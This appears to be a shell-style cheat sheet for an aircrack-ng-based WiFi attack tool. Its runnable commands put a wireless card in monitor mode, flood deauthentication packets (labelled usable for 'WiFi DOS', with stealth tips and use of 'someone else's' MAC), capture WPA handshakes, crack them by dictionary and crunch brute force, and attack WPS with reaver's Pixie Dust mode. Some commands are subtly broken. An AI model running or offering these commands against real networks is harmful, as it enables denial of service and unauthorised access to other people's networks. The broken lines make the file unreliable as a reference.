#LINKS:
#https://www.aircrack-ng.org/doku.php?id=airmon-ng
#https://www.aircrack-ng.org/doku.php?id=airodump-ng
#https://www.aircrack-ng.org/doku.php?id=deauthentication
#https://www.aircrack-ng.org/doku.php?id=cracking_wpa


#====RUNTIME REQUIREMENTS====

#RUN AS ROOT
sudo su

#====INTERFACE SCANNING====

#GATHER NETWORK DEVICES
lshw -class network -quiet -json

#SELECT NETWORK DEVICE, THIS CASE BEING WLAN1
wlan_device="wlan1"
#note that certain devices may name themselves as wlanXmon depending on situation

#====WIFI WPA/WPS SCANNING/CAPTURE PREPARATION (SAFE WAY)====

#====START MONITORING MODE====
ifconfig <wlan device> down
iwconfig <wlan_device> mode monitor channel <channel> #optional to remove channel flag if nothing specified but less effective
ifconfig <wlan_device> up

#====END MONITORING MODE====
ifconfig <wlan device> down
iwconfig <wlan_device> mode monitor managed
ifconfig <wlan_device> up

#====WIFI WPA SCANNING PROPER====

#SCAN NETWORK AND DUMP INTO .CSV FILE
sample_tempfilename = "2022-10-29-17-08-00" #name format = yyyy-mm-dd-hh-mm-ss.csv
airodump-ng $wlan_device --update 1 -w $sample_tempfilename -o csv

#Better to execute command on a countdown then end subprocess afterwardss

#ASSUME A TARGET HAS BEEN SELECTED
#The ff variables must be also available on actual python script
target_essid = "LAB_NETWORK"
target_bssid = "AC:84:C6:94:DA:08"
target_channel = "6" #to parse as int when needed but used as str most of the time
wlan_mac = "F4:28:53:14:88:3B" #mac address of wlan_device
wlan_logical = "wlan1"
host_mac = "A4:FF:12:14:90:B3"

#====DEAUTH ATTACK====

#This command can be used for both handshake capture and WiFi DOS attack.

#This command deauths all devices continously.
aireplay-ng -0 0 -a $target_bssid $wlan_logical #NOISY

#This command deauths specific device continously.
#You'd wanna use someone else's or your other device's 
#MAC address who's able to connect already.
aireplay-ng -0 0 -a $target_bssid -c $host_mac $wlan_logical #KINDA STEALTHY


#====WIFI WPS SCANNING PROPER====
#The ff variables must be also available on actual python script
target_essid = "LAB_NETWORK"
target_bssid = "AC:84:C6:94:DA:08"
target_channel = "6" #to parse as int when needed but used as str most of the time
wlan_mac = "F4:28:53:14:88:3B" #mac address of wlan_device
wlan_logical = "wlan1"
host_mac = "A4:FF:12:14:90:B3"

#====HANDSHAKE CAPTURE====

#EXECUTE HANDSHAKE CAPTURE
airodump-ng -c $target_channel --bssid $target_bssid --update 1 -w capture $wlan_device

#COWPATTY FOR CHECKING WPA/2 HANDSHAKE IN CAP FILE

#It is optional to execute deauth attack simultaneously or just after handshake capture began
#since the term 'handshake capture' implies that it must catch attempts of other hosts to 
#connect to the target WiFi network.

#====WPA CRACKING VIA DICTIONARY====
aircrack-ng -w <path_to_dictionary> <capture file>

#====WPA CRACKING VIA BRUTEFORCE====
crunch <min> <max> <charset> | aircrack-ng -e <SSID> -w - <capture file>

#====WPS SCAN====
sudo wash -i $wlan_logical --json

#====WPS CAPTURE + CRACKING (VIA PIXIEWPS)====
reaver -i <wlan> -c <channel> -b <bssid of WiFi> -K